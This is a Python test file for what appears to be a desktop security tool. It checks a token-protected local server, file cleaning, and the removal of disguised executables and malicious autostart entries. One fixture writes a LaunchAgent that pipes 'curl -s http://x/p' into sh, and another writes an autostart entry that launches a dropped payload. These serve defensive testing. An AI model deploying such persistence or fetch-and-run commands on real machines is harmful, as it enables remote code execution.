import json,threading,unittest,urllib.request,urllib.error
from unittest.mock import patch
from http.server import ThreadingHTTPServer
from portable.app import handler,snapshot

class PortableTests(unittest.TestCase):
    def test_snapshot_scope(self):
        value=snapshot();self.assertTrue(value['platform']);self.assertIn('removed on its own',value['scope'])
    def test_token_host_and_bounded_post(self):
        state={'device':snapshot(),'busy':False};port=[0]
        server=ThreadingHTTPServer(('127.0.0.1',0),handler('local-test-token',state,threading.Lock(),port));port[0]=server.server_port
        t=threading.Thread(target=server.serve_forever,daemon=True);t.start()
        base=f'http://127.0.0.1:{port[0]}'
        try:
            with urllib.request.urlopen(base+'/?t=local-test-token') as r:self.assertIn(b'aureon',r.read())
            for headers in ({},{'Host':'untrusted.example','X-Aureon-Token':'local-test-token'}):
                with self.assertRaises(urllib.error.HTTPError) as e:urllib.request.urlopen(urllib.request.Request(base+'/api/state',headers=headers))
                self.assertEqual(e.exception.code,403)
            with urllib.request.urlopen(urllib.request.Request(base+'/api/state',headers={'X-Aureon-Token':'local-test-token'})) as r:self.assertIn('device',json.load(r))
        finally:server.shutdown();server.server_close();t.join()

class AutomationTests(unittest.TestCase):
    def test_new_download_gets_clean_copy_and_old_trash_goes(self):
        import tempfile,time,pathlib
        from portable.automation import Automation
        d=pathlib.Path(tempfile.mkdtemp());(d/'old.svg').write_text('<svg><!-- a --></svg>')
        t=pathlib.Path(tempfile.mkdtemp());(t/'info').mkdir();(t/'files').mkdir();(t/'files'/'x').write_text('x')
        (t/'info'/'x.trashinfo').write_text('[Trash Info]\nDeletionDate=2020-01-01T00:00:00\n')
        a=Automation(downloads=d,trash_days=30,watch=[d])
        a.tick_downloads()
        (d/'new.svg').write_text('<svg><!-- secret --><rect/></svg>')
        a.tick_downloads();a.tick_downloads();a.tick_downloads()
        self.assertFalse((d/'old.clean.svg').exists())
        self.assertNotIn('secret',(d/'new.clean.svg').read_text())
        self.assertIn('secret',(d/'new.svg').read_text())
        self.assertEqual(len(list(d.glob('*.clean*'))),1)
        with patch('aureon_defender.trash.linux_trash_dirs',return_value=[t]):a.tick_trash()
        self.assertFalse((t/'files'/'x').exists())
        self.assertTrue(a.report()['method'])

    def test_threats_are_removed_silently_but_hardware_files_stay(self):
        import tempfile,pathlib,os
        os.environ['AUREON_DATA']=tempfile.mkdtemp()
        from portable.automation import Automation
        d=pathlib.Path(tempfile.mkdtemp())
        (d/'old-invoice.pdf').write_bytes(b'\x7fELF disguised program')           # already there: swept once
        (d/'notes.txt').write_text('just notes')
        a=Automation(downloads=d,trash_days=30,watch=[d],clean=False)
        a.tick_protect();a.tick_downloads()
        self.assertFalse((d/'old-invoice.pdf').exists())
        self.assertTrue((d/'notes.txt').exists())
        (d/'photo.jpg.exe').write_bytes(b'MZ new arrival')
        a.tick_downloads();a.tick_downloads()
        self.assertFalse((d/'photo.jpg.exe').exists())
        self.assertEqual(a.status()['counts']['removed'],2)
        self.assertEqual(a.status()['vault'],2)
        self.assertTrue(all(x.get('blocked') for x in a.log if x['title'].startswith('removed')))
        boot=d/'bootx64.efi';boot.write_bytes(b'\x7fELF flagged but part of the boot chain')
        self.assertFalse(a.check(boot))
        self.assertTrue(boot.exists())
        self.assertTrue(a.log[0]['title'].startswith('kept'))

    def test_bad_autostart_entry_and_its_program_are_removed(self):
        import tempfile,pathlib,os,plistlib
        os.environ['AUREON_DATA']=tempfile.mkdtemp()
        from portable.automation import Automation,autostart_target
        home=pathlib.Path(tempfile.mkdtemp());auto=home/'autostart';auto.mkdir();agents=home/'LaunchAgents';agents.mkdir()
        (auto/'editor.desktop').write_text('[Desktop Entry]\nExec=/usr/bin/gedit\n')
        a=Automation(downloads=home,trash_days=30,watch=[home],clean=False);a.tick_autostart(dirs=[auto,agents])
        self.assertTrue((auto/'editor.desktop').exists())                    # ordinary entry left alone
        drop=home/'invoice.pdf';drop.write_bytes(b'\x7fELF payload')
        (auto/'updater.desktop').write_text(f'[Desktop Entry]\nExec={drop} --quiet\n')
        (agents/'com.helper.plist').write_bytes(plistlib.dumps({'Label':'h','ProgramArguments':['/bin/sh','-c','curl -s http://x/p | sh']}))
        self.assertEqual(autostart_target(agents/'com.helper.plist'),'/bin/sh')
        a.next_autostart=0;a.tick_autostart(dirs=[auto,agents])
        self.assertFalse((auto/'updater.desktop').exists())
        self.assertFalse(drop.exists())
        self.assertTrue((auto/'editor.desktop').exists())
        if os.name!='nt':self.assertTrue(pathlib.Path('/bin/sh').exists())    # system program never touched
        titles=[x['title'] for x in a.log]
        self.assertIn('removed autostart entry updater.desktop',titles)
        self.assertFalse((agents/'com.helper.plist').exists())                # launch agent that pipes curl into sh

if __name__=='__main__':unittest.main()
